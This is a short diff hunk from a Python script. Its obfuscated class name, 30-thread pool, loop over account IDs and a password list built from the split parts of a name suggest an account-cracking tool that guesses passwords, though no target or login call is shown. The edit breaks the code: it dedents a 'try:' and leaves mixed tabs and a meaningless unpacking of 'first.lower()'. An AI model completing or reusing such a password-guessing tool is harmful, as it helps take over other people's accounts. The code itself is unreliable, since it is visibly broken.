@@ -245,7 +245,7 @@ class __xxx__:
             print(47*"-")
             with sarfrazssb(max_workers=30) as ssbworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
-                    try:
+                try:
                     idf,nmf = first.lower()
 	            	frs = nmf.split(' ')
 	            	pwv = []
